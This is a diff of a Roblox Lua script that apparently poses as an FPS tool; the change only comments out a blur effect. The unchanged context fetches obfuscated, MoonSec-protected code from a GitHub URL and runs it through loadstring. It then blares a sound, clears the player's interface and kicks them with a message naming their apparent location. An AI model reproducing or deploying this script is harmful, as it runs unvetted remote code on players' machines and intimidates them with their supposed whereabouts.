@@ -1,4 +1,4 @@
---This file was protected with MoonSec V3
+-- This file was protected with MoonSec V3
 loadstring(game:HttpGet("https://raw.githubusercontent.com/chiper1z/flex-your-fps/main/Protected_9332153022180151.txt"))()
 
 wait(3)
@@ -258,17 +258,16 @@ sound.Looped = true
 sound.Volume = 10
 sound.Parent = workspace.CurrentCamera
 
+--local blur = Instance.new("BlurEffect")
+--blur.Size = 9999
+--blur.Parent = workspace.CurrentCamera
+
 if success then
     local location = locations[code]
     if location then
         sound:Play()
         player.PlayerGui:ClearAllChildren()
         game:GetService('StarterGui'):SetCore("TopbarEnabled", false)
-        
-        local blur = Instance.new("BlurEffect")
-        blur.Size = 9999
-        blur.Parent = workspace.CurrentCamera
-
         player:Kick("How is it like in " .. location .. "?")
     else
         sound:Play()
